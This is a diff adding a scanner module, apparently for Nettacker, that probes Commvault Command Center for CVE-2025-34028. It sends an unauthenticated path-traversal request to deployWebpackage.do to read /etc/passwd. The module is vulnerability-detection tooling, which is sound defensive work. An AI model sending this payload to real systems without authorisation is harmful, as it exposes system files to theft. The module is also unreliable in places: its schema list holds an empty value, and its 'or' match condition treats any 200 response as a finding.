@@ -1,0 +1,56 @@
+info:
+  name: commvault_cve_2025_34028_vuln
+  author: Aryan
+  severity: 10.0
+  description: >
+    Commvault Command Center versions prior to 11.38.20 are vulnerable to
+    an unauthenticated path traversal vulnerability (CVE-2025-34028).
+    A remote attacker can exploit this flaw to traverse outside of
+    restricted directories and retrieve sensitive files from the server
+    without authentication. This vulnerability is actively exploited in
+    the wild and listed in the CISA Known Exploited Vulnerabilities catalog.
+    CVSS score: 10.0 Critical.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-34028
+    - https://documentation.commvault.com/securityadvisories/cv_2025_34028
+    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+  profiles:
+    - vuln
+    - http
+    - cve
+    - cve_2025
+    - commvault
+    - path_traversal
+    - critical_severity
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 5
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/commandcenter/deployWebpackage.do?packageName=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - 
+              ports:
+                - 80
+                - 443
+                - 8080
+                - 8443
+        response:
+          condition_type: or
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "(?i)(root:.*:/bin/|commvault|CommandCenter|deployWebpackage)"
+              reverse: false
